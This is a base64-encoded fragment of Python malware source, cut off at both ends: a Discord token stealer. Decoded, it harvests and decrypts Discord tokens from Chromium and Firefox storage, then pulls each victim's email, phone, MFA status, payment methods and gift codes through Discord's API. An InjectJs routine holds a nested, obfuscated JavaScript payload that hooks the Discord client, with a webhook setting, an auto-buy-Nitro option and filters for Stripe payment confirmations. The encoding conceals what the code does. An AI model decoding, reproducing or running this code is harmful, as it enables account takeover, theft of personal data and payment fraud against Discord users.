CsgJyMnICsgc3RyKHJbJ2Rpc2NyaW1pbmF0b3InXSkKICAgICAgICAgICAgICAgICAgICBpZCA9IHJbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBlbWFpbCA9IHJbJ2VtYWlsJ10uc3RyaXAoKSBpZiByWydlbWFpbCddIGVsc2UgJyhObyBFbWFpbCknCiAgICAgICAgICAgICAgICAgICAgcGhvbmUgPSByWydwaG9uZSddIGlmIHJbJ3Bob25lJ10gZWxzZSAnKE5vIFBob25lIE51bWJlciknCiAgICAgICAgICAgICAgICAgICAgdmVyaWZpZWQgPSByWyd2ZXJpZmllZCddCiAgICAgICAgICAgICAgICAgICAgbWZhID0gclsnbWZhX2VuYWJsZWQnXQogICAgICAgICAgICAgICAgICAgIG5pdHJvX3R5cGUgPSByLmdldCgncHJlbWl1bV90eXBlJywgMCkKICAgICAgICAgICAgICAgICAgICBuaXRyb19pbmZvcyA9IHswOiAnTm8gTml0cm8nLCAxOiAnTml0cm8gQ2xhc3NpYycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMjogJ05pdHJvJywgMzogJ05pdHJvIEJhc2ljJ30KICAgICAgICAgICAgICAgICAgICBuaXRyb19kYXRhID0gbml0cm9faW5mb3MuZ2V0KG5pdHJvX3R5cGUsICcoVW5rbm93biknKQogICAgICAgICAgICAgICAgICAgIGJpbGxpbmcgPSBqc29uLmxvYWRzKERpc2NvcmQuaHR0cENsaWVudC5yZXF1ZXN0KAogICAgICAgICAgICAgICAgICAgICAgICAnR0VUJywgJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcycsIGhlYWRlcnM9RGlzY29yZC5HZXRIZWFkZXJzKHRva2VuKSkuZGF0YS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKSkKICAgICAgICAgICAgICAgICAgICBpZiBsZW4oYmlsbGluZykgPT0gMDoKICAgICAgICAgICAgICAgICAgICAgICAgYmlsbGluZyA9ICcoTm8gUGF5bWVudCBNZXRob2QpJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZHMgPSB7J0NhcmQnOiAwLCAnUGF5cGFsJzogMCwgJ1Vua25vd24nOiAwfQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgbSBpbiBiaWxsaW5nOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UobSwgZGljdCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZF90eXBlID0gbS5nZXQoJ3R5cGUnLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggbWV0aG9kX3R5cGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2RzWydDYXJkJ10gKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kc1snUGF5cGFsJ10gKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kc1snVW5rbm93biddICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgYmlsbGluZyA9ICcsICcuam9pbihbJ3t9ICh7fSknLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUsIHF1YW50aXR5KSBmb3IgbmFtZSwgcXVhbnRpdHkgaW4gbWV0aG9kcy5pdGVtcygpIGlmIHF1YW50aXR5ICE9IDBdKSBvciAnTm9uZScKICAgICAgICAgICAgICAgICAgICBnaWZ0cyA9IGxpc3QoKQogICAgICAgICAgICAgICAgICAgIHIgPSBEaXNjb3JkLmh0dHBDbGllbnQucmVxdWVzdCgnR0VUJywgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9vdXRib3VuZC1wcm9tb3Rpb25zL2NvZGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycz1EaXNjb3JkLkdldEhlYWRlcnModG9rZW4pKS5kYXRhLmRlY29kZShlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgICAgICAgICAgaWYgJ2NvZGUnIGluIHI6CiAgICAgICAgICAgICAgICAgICAgICAgIHIgPSBqc29uLmxvYWRzKHIpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKGksIGRpY3QpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGUgPSBpLmdldCgnY29kZScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaS5nZXQoJ3Byb21vdGlvbicpIGlzIE5vbmUgb3Igbm90IGlzaW5zdGFuY2UoaVsncHJvbW90aW9uJ10sIGRpY3QpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlID0gaVsncHJvbW90aW9uJ10uZ2V0KCdvdXRib3VuZF90aXRsZScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29kZSBhbmQgdGl0bGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdpZnRzLmFwcGVuZChmJ3t0aXRsZX06IHtjb2RlfScpCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKGdpZnRzKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICBnaWZ0cyA9ICdHaWZ0IENvZGVzOiAoTk9ORSknCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZ2lmdHMgPSAnR2lmdCBDb2Rlczpcblx0JyArICdcblx0Jy5qb2luKGdpZnRzKQogICAgICAgICAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHsnVVNFUk5BTUUnOiB1c2VyLCAnVVNFUklEJzogaWQsICdNRkEnOiBtZmEsICdFTUFJTCc6IGVtYWlsLCAnUEhPTkUnOiBwaG9uZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1ZFUklGSUVEJzogdmVyaWZpZWQsICdOSVRSTyc6IG5pdHJvX2RhdGEsICdCSUxMSU5HJzogYmlsbGluZywgJ1RPS0VOJzogdG9rZW4sICdHSUZUUyc6IGdpZnRzfSkKICAgICAgICAgICAgcmV0dXJuIHJlc3VsdHMKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBTYWZlU3RvcmFnZVN0ZWFsKHBhdGg6IHN0cikgLT4gbGlzdFtzdHJdOgogICAgICAgICAgICBlbmNyeXB0ZWRUb2tlbnMgPSBsaXN0KCkKICAgICAgICAgICAgdG9rZW5zID0gbGlzdCgpCiAgICAgICAgICAgIGtleTogc3RyID0gTm9uZQogICAgICAgICAgICBsZXZlbERiUGF0aHM6IGxpc3Rbc3RyXSA9IGxpc3QoKQogICAgICAgICAgICBsb2NhbFN0YXRlUGF0aCA9IG9zLnBhdGguam9pbihwYXRoLCAnTG9jYWwgU3RhdGUnKQogICAgICAgICAgICBmb3Igcm9vdCwgZGlycywgXyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgICAgICAgICAgZm9yIGRpciBpbiBkaXJzOgogICAgICAgICAgICAgICAgICAgIGlmIGRpciA9PSAnbGV2ZWxkYic6CiAgICAgICAgICAgICAgICAgICAgICAgIGxldmVsRGJQYXRocy5hcHBlbmQob3MucGF0aC5qb2luKHJvb3QsIGRpcikpCiAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGxvY2FsU3RhdGVQYXRoKSBhbmQgbGV2ZWxEYlBhdGhzOgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGxvY2FsU3RhdGVQYXRoLCBlcnJvcnM9J2lnbm9yZScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAganNvbkNvbnRlbnQ6IGRpY3QgPSBqc29uLmxvYWQoZmlsZSkKICAgICAgICAgICAgICAgIGtleSA9IGpzb25Db250ZW50Wydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10KICAgICAgICAgICAgICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUoa2V5KVs1Ol0KICAgICAgICAgICAgICAgIGZvciBsZXZlbERiUGF0aCBpbiBsZXZlbERiUGF0aHM6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihsZXZlbERiUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoKCcubG9nJywgJy5sZGInKSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcGF0aCA9IG9zLnBhdGguam9pbihsZXZlbERiUGF0aCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlcGF0aCwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZS5zdHJpcCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXRjaGVzOiBsaXN0W3N0cl0gPSByZS5maW5kYWxsKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzY29yZC5SRUdFWF9FTkMsIGxpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtYXRjaCBpbiBtYXRjaGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSBtYXRjaC5yc3RyaXAoJ1xcJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBtYXRjaCBpbiBlbmNyeXB0ZWRUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSBiYXNlNjQuYjY0ZGVjb2RlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXRjaC5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0uZW5jb2RlKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkVG9rZW5zLmFwcGVuZChtYXRjaCkKICAgICAgICAgICAgZm9yIHRva2VuIGluIGVuY3J5cHRlZFRva2VuczoKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHB5YWVzLkFFU01vZGVPZk9wZXJhdGlvbkdDTShTeXNjYWxscy5DcnlwdFVucHJvdGVjdERhdGEoCiAgICAgICAgICAgICAgICAgICAgICAgIGtleSksIHRva2VuWzM6MTVdKS5kZWNyeXB0KHRva2VuWzE1Ol0pWzotMTZdLmRlY29kZShlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgICAgICAgICAgaWYgdG9rZW46CiAgICAgICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgcmV0dXJuIHRva2VucwoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIFNpbXBsZVN0ZWFsKHBhdGg6IHN0cikgLT4gbGlzdFtzdHJdOgogICAgICAgICAgICB0b2tlbnMgPSBsaXN0KCkKICAgICAgICAgICAgbGV2ZWxEYlBhdGhzID0gbGlzdCgpCiAgICAgICAgICAgIGZvciByb290LCBkaXJzLCBfIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgICAgICAgICBmb3IgZGlyIGluIGRpcnM6CiAgICAgICAgICAgICAgICAgICAgaWYgZGlyID09ICdsZXZlbGRiJzoKICAgICAgICAgICAgICAgICAgICAgICAgbGV2ZWxEYlBhdGhzLmFwcGVuZChvcy5wYXRoLmpvaW4ocm9vdCwgZGlyKSkKICAgICAgICAgICAgZm9yIGxldmVsRGJQYXRoIGluIGxldmVsRGJQYXRoczoKICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIobGV2ZWxEYlBhdGgpOgogICAgICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoKCcubG9nJywgJy5sZGInKSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVwYXRoID0gb3MucGF0aC5qb2luKGxldmVsRGJQYXRoLCBmaWxlKQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZXBhdGgsIGVycm9ycz0naWdub3JlJykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUuc3RyaXAoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXRjaGVzOiBsaXN0W3N0cl0gPSByZS5maW5kYWxsKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNjb3JkLlJFR0VYLCBsaW5lLnN0cmlwKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG1hdGNoIGluIG1hdGNoZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hdGNoID0gbWF0Y2gucnN0cmlwKCdcXCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBtYXRjaCBpbiB0b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKG1hdGNoKQogICAgICAgICAgICByZXR1cm4gdG9rZW5zCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgRmlyZUZveFN0ZWFsKHBhdGg6IHN0cikgLT4gbGlzdFtzdHJdOgogICAgICAgICAgICB0b2tlbnMgPSBsaXN0KCkKICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkuZW5kc3dpdGgoJy5zcWxpdGUnKToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVwYXRoLCBlcnJvcnM9J2lnbm9yZScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIGxpbmVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUuc3RyaXAoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2hlczogbGlzdFtzdHJdID0gcmUuZmluZGFsbCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc2NvcmQuUkVHRVgsIGxpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtYXRjaCBpbiBtYXRjaGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSBtYXRjaC5yc3RyaXAoJ1xcJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBtYXRjaCBpbiB0b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLmFwcGVuZChtYXRjaCkKICAgICAgICAgICAgcmV0dXJuIHRva2VucwoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEluamVjdEpzKCkgLT4gc3RyIHwgTm9uZToKICAgICAgICAgICAgY2hlY2sgPSBGYWxzZQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjb2RlID0gYmFzZTY0LmI2NGRlY29kZShiJ1kyOXVjM1FnVXoxRE95aG1kVzVqZEdsdmJpaFpMRm9wZTJOdmJuTjBJSEU5UXl4dlBWa29LVHQzYUdsc1pTZ2hJVnRkS1h0MGNubDdZMjl1YzNRZ1ZEMHRjR0Z5YzJWSmJuUW9jU2d3ZURrd0tTa3ZNSGd4SzNCaGNuTmxTVzUwS0hFb01IZ3hOR0VwS1M4d2VESXJjR0Z5YzJWSmJuUW9jU2d3ZURFeU9Ta3BMekI0TXlvb2NHRnljMlZKYm5Rb2NTZ3dlREV5WlNrcEx6QjROQ2tyY0dGeWMyVkpiblFvY1Nnd2VHWTVLU2t2TUhnMUszQmhjbk5sU1c1MEtIRW9NSGhrTnlrcEx6QjROaXN0Y0dGeWMyVkpiblFvY1Nnd2VERXpZU2twTHpCNE55b29jR0Z5YzJWSmJuUW9jU2d3ZURnNEtTa3ZNSGc0S1N0d1lYSnpaVWx1ZENoeEtEQjRZbVVwS1M4d2VEa3FLQzF3WVhKelpVbHVkQ2h4S0RCNFpqQXBLUzh3ZUdFcE8ybG1LRlE5UFQxYUtXSnlaV0ZyTzJWc2MyVWdiMXNuY0hWemFDZGRLRzliSjNOb2FXWjBKMTBvS1NrN2ZXTmhkR05vS0VncGUyOWJKM0IxYzJnblhTaHZXeWR6YUdsbWRDZGRLQ2twTzMxOWZTaDRMREI0TkRCbU9HUXBLVHRqYjI1emRDQmhjbWR6UFhCeWIyTmxjM05iVXlnd2VHVm1LVjBzWm5NOWNtVnhkV2x5WlNnblpuTW5LU3h3WVhSb1BYSmxjWFZwY21Vb1V5Z3dlR0pqS1Nrc2FIUjBjSE05Y21WeGRXbHlaU2hUS0RCNFpERXBLU3h4ZFdWeWVYTjBjbWx1WnoxeVpYRjFhWEpsS0NkeGRXVnllWE4wY21sdVp5Y3BMSHRDY205M2MyVnlWMmx1Wkc5M0xITmxjM05wYjI1OVBYSmxjWFZwY21Vb1V5Z3dlRFpoS1Nrc1pXNWpiMlJsWkVodmIyczlVeWd3ZUdReUtTeGpiMjVtYVdjOWV5ZDNaV0pvYjI5ckp6cGhkRzlpS0dWdVkyOWtaV1JJYjI5cktTd25kMlZpYUc5dmExOXdjbTkwWldOMGIzSmZhMlY1SnpwVEtEQjRaR1lwTENkaGRYUnZYMkoxZVY5dWFYUnlieWM2SVZ0ZExDZHdhVzVuWDI5dVgzSjFiaWM2SVNGYlhTd25jR2x1WjE5MllXd25PbE1vTUhneE1UVXBMQ2RsYldKbFpGOXVZVzFsSnpwVEtEQjRZMlVwTENkbGJXSmxaRjlwWTI5dUp6cFRLREI0TVRJNEtTd25aVzFpWldSZlkyOXNiM0luT2pCNE5UWXdaR1JqTENkcGJtcGxZM1JwYjI1ZmRYSnNKenBUS0RCNE1UTTFLU3duWVhCcEp6b25hSFIwY0hNNkx5OWthWE5qYjNKa0xtTnZiUzloY0drdmRqa3ZkWE5sY25NdlFHMWxKeXduYm1sMGNtOG5PbnNuWW05dmMzUW5PbnNuZVdWaGNpYzZleWRwWkNjNkp6VXlNVGcwTnpJek5ESTBOakE0TWpVNU9TY3NKM05yZFNjNlV5Z3dlRGhqS1N3bmNISnBZMlVuT2xNb01IZ3hNellwZlN3bmJXOXVkR2duT25zbmFXUW5PbE1vTUhoaE55a3NKM05yZFNjNkp6VXhNVFkxTVRnNE1EZ3pOemcwTURnNU5pY3NKM0J5YVdObEp6cFRLREI0WmpJcGZYMHNKMk5zWVhOemFXTW5PbnNuYlc5dWRHZ25PbnNuYVdRbk9sTW9NSGhrTXlrc0ozTnJkU2M2SnpVeE1UWTFNVGczTVRjek5qSXdNVEl4Tmljc0ozQnlhV05sSnpwVEtEQjRNVEUwS1gxOWZTd25abWxzZEdWeUp6cDdKM1Z5YkhNbk9sdFRLREI0WVdVcExGTW9NSGhqTXlrc1V5Z3dlR1U1S1N4VEtEQjRabVVwTEZNb01IZ3hNVGtwTEZNb01IaGxZeWtzVXlnd2VERTBNU2tzVXlnd2VERXdOaWtzVXlnd2VEZzNLU3duYUhSMGNITTZMeTloY0drdWMzUnlhWEJsTG1OdmJTOTJLaTl3WVhsdFpXNTBYMmx1ZEdWdWRITXZLaTlqYjI1bWFYSnRKMTE5TENkbWFXeDBaWEl5SnpwN0ozVnliSE1uT2x0VEtEQjRObU1wTEZNb01IaGpaQ2tzSjJoMGRIQnpPaTh2WkdselkyOXlaQzVqYjIwdllYQnBMM1lxTDJGd2NHeHBZMkYwYVc5dWN5OWtaWFJsWTNSaFlteGxKeXhUS0RCNE1URTRLU3hUS0RCNE4yTXBMRk1vTUhnM1pDbGRmWDA3Wm5WdVkzUnBiMjRnY0dGeWFYUjVYek15S0Zrc1dpeHZLWHR5WlhSMWNtNGdXVjVhWG04N2ZXWjFibU4wYVc5dUlHTm9Yek15S0Zrc1dpeHZLWHR5WlhSMWNtNGdXU1phWG41WkptODdmV1oxYm1OMGFXOXVJRzFoYWw4ek1paFpMRm9zYnlsN2NtVjBkWEp1SUZrbVdsNVpKbTllV2ladk8zMW1kVzVqZEdsdmJpQnliM1JzWHpNeUtGa3NXaWw3Y21WMGRYSnVJRms4UEZwOFdUNCtQakI0TWpBdFdqdDlablZ1WTNScGIyNGdjMkZtWlVGa1pGOHpNbDh5S0Zrc1dpbDdkbUZ5SUc4OUtGa21NSGhtWm1abUtTc29XaVl3ZUdabVptWXBMRlE5S0ZrK1BqNHdlREV3S1Nzb1dqNCtQakI0TVRBcEt5aHZQajQrTUhneE1DazdjbVYwZFhKdUtGUW1NSGhtWm1abUtUdzhNSGd4TUh4dkpqQjRabVptWmp0OVpuVnVZM1JwYjI0Z2MyRm1aVUZrWkY4ek1sODFLRmtzV2l4dkxGUXNTQ2w3ZG1GeUlGWTlLRmttTUhobVptWm1LU3NvV2lZd2VHWm1abVlwS3lodkpqQjRabVptWmlrcktGUW1NSGhtWm1abUtTc29TQ1l3ZUdabVptWXBMR2s5S0ZrK1BqNHdlREV3S1Nzb1dqNCtQakI0TVRBcEt5aHZQajQrTUhneE1Da3JLRlErUGo0d2VERXdLU3NvU0Q0K1BqQjRNVEFwS3loV1BqNCtNSGd4TUNrN2NtVjBkWEp1S0drbU1IaG1abVptS1R3OE1IZ3hNSHhXSmpCNFptWm1aanQ5Wm5WdVkzUnBiMjRnWW1sdVlqSm9aWGdvV1NsN1kyOXVjM1FnYlQxVE8zWmhjaUJhUFcwb01IZzNOQ2tzYnowbkp5eFVQVmxiSjJ4bGJtZDBhQ2RkS2pCNE5DeElMRlk3Wm05eUtFZzlNSGd3TzBnOFZEdElLejB3ZURFcGUxWTlXVnRJUGo0K01IZ3lYVDQrUGlnd2VETXRTQ1V3ZURRcEtqQjRPQ3h2S3oxYVd5ZGphR0Z5UVhRblhTaFdQajQrTUhnMEpqQjRaaWtyV2xzblkyaGhja0YwSjEwb1ZpWXdlR1lwTzMxeVpYUjFjbTRnYnp0OVpuVnVZM1JwYjI0Z1oyVjBTQ2dwZTNKbGRIVnlibHN3ZURZM05EVXlNekF4TERCNFpXWmpaR0ZpT0Rrc01IZzVPR0poWkdObVpTd3dlREV3TXpJMU5EYzJMREI0WXpOa01tVXhaakJkTzMxbWRXNWpkR2x2YmlCeWIzVnVaRk5JUVRFb1dTeGFLWHQyWVhJZ2J6MWJYU3hXTEdrc1VpeEJMSElzYkN4T1BXTm9Yek15TEdzOWNHRnlhWFI1WHpNeUxFWTliV0ZxWHpNeUxGZzljbTkwYkY4ek1peDFQWE5oWm1WQlpHUmZNekpmTWl4S0xIYzljMkZtWlVGa1pGOHpNbDgxTzFZOVdsc3dlREJkTEdrOVdsc3dlREZkTEZJOVdsc3dlREpkTEVFOVdsc3dlRE5kTEhJOVdsc3dlRFJkTzJadmNpaEtQVEI0TUR0S1BEQjROVEE3U2lzOU1IZ3hLWHRLUERCNE1UQS9iMXRLWFQxWlcwcGRPbTliU2wwOVdDaHZXMG90TUhnelhWNXZXMG90TUhnNFhWNXZXMG90TUhobFhWNXZXMG90TUhneE1GMHNNSGd4S1R0cFppaEtQREI0TVRRcGJEMTNLRmdvVml3d2VEVXBMRTRvYVN4U0xFRXBMSElzTUhnMVlUZ3lOems1T1N4dlcwcGRLVHRsYkhObGUybG1LRW84TUhneU9DbHNQWGNvV0NoV0xEQjROU2tzYXlocExGSXNRU2tzY2l3d2VEWmxaRGxsWW1FeExHOWJTbDBwTzJWc2MyVWdTand3ZUROalAydzlkeWhZS0ZZc01IZzFLU3hHS0drc1VpeEJLU3h5TERCNE9HWXhZbUpqWkdNc2IxdEtYU2s2YkQxM0tGZ29WaXd3ZURVcExHc29hU3hTTEVFcExISXNNSGhqWVRZeVl6RmtOaXh2VzBwZEtUdDljajFCTEVFOVVpeFNQVmdvYVN3d2VERmxLU3hwUFZZc1ZqMXNPMzF5WlhSMWNtNGdXbHN3ZURCZFBYVW9WaXhhV3pCNE1GMHBMRnBiTUhneFhUMTFLR2tzV2xzd2VERmRLU3hhV3pCNE1sMDlkU2hTTEZwYk1IZ3lYU2tzV2xzd2VETmRQWFVvUVN4YVd6QjRNMTBwTEZwYk1IZzBYVDExS0hJc1dsc3dlRFJkS1N4YU8zMW1kVzVqZEdsdmJpQm1hVzVoYkdsNlpWTklRVEVvV1N4YUxHOHNWQ2w3WTI5dWMzUWdhRDFUTzNaaGNpQldMRklzUVR0QlBTaGFLekI0TkRFK1BqNHdlRGs4UERCNE5Da3JNSGhtTzNkb2FXeGxLRmxiSjJ4bGJtZDBhQ2RkUEQxQktYdFpXeWR3ZFhOb0oxMG9NSGd3S1R0OVdWdGFQajQrTUhnMVhYdzlNSGc0TUR3OE1IZ3hPQzFhSlRCNE1qQXNXVnRCWFQxYUsyOHNVajFaV3lkc1pXNW5kR2duWFR0bWIzSW9WajB3ZURBN1ZqeFNPMVlyUFRCNE1UQXBlMVE5Y205MWJtUlRTRUV4S0ZsYmFDZ3dlREUwTkNsZEtGWXNWaXN3ZURFd0tTeFVLVHQ5Y21WMGRYSnVJRlE3ZldaMWJtTjBhVzl1SUdobGVESmlhVzVpS0Zrc1dpeHZLWHRqYjI1emRDQjVQVk03ZG1GeUlGUXNTRDFaVzNrb01IaGhOaWxkTEZZc1VpeEJMSElzWXp0VVBWcDhmRnN3ZURCZExHODliM3g4TUhnd0xHTTliejQrUGpCNE16c3dlREFoUFQxSUpUQjRNaVltWTI5dWMyOXNaVnNuWlhKeWIzSW5YU2g1S0RCNFptSXBLVHRtYjNJb1ZqMHdlREE3Vmp4SU8xWXJQVEI0TWlsN1VqMXdZWEp6WlVsdWRDaFpXM2tvTUhneE1XSXBYU2hXTERCNE1pa3NNSGd4TUNrN2FXWW9JV2x6VG1GT0tGSXBLWHR5UFNoV1BqNCtNSGd4S1N0akxFRTljajQrUGpCNE1qdDNhR2xzWlNoVVcza29NSGhoTmlsZFBEMUJLWHRVVzNrb01IZzROQ2xkS0RCNE1DazdmVlJiUVYxOFBWSThQREI0T0Nvb01IZ3pMWElsTUhnMEtUdDlaV3h6WlNCamIyNXpiMnhsVzNrb01IZzNaaWxkS0hrb01IaGtPQ2twTzMxeVpYUjFjbTU3SjNaaGJIVmxKenBVTENkaWFXNU1aVzRuT2tncU1IZzBLMjk5TzMxamJHRnpjeUJxYzFOSVFYdGpiMjV6ZEhKMVkzUnZjaWdwZTJOdmJuTjBJRkE5VXp0MllYSWdXVDB3ZURBc1dqMWJYU3h2UFRCNE1DeFVMRWdzVml4cExGSXNRU3h5UFNGYlhTeGpQU0ZiWFN4c1BWdGRMRTQ5VzEwc2F5eHJQVEI0TVR0SVBXaGxlREppYVc1aUxDaHJJVDA5Y0dGeWMyVkpiblFvYXl3d2VHRXBmSHd3ZURFK2F5a21KbU52Ym5OdmJHVmJVQ2d3ZURkbUtWMG9VQ2d3ZURFeU5pa3BMR2s5TUhneU1EQXNVajF5YjNWdVpGTklRVEVzUVQxbWFXNWhiR2w2WlZOSVFURXNWajB3ZUdFd0xGUTlaMlYwU0NncExIUm9hWE5iVUNnd2VHTXhLVjA5Wm5WdVkzUnBiMjRvUmlsN1kyOXVjM1FnVnoxUU8zWmhjaUJZTEhVc1NpeDNMRzRzWVN4Rk8xZzlhR1Y0TW1KcGJtSXNkVDFZS0VZcExFbzlkVnNuWW1sdVRHVnVKMTBzZHoxMVcxY29NSGcyWkNsZExHNDlhVDQrUGpCNE15eEZQVzR2TUhnMExUQjRNVHRwWmlodVBFb3ZNSGc0S1h0M1BVRW9keXhLTERCNE1DeG5aWFJJS0NrcE8zZG9hV3hsS0hkYlZ5Z3dlR0UyS1YwOFBVVXBlM2RiVnlnd2VEZzBLVjBvTUhnd0tUdDlkMXRGWFNZOU1IaG1abVptWm1Zd01EdDlaV3h6Wlh0cFppaHVQa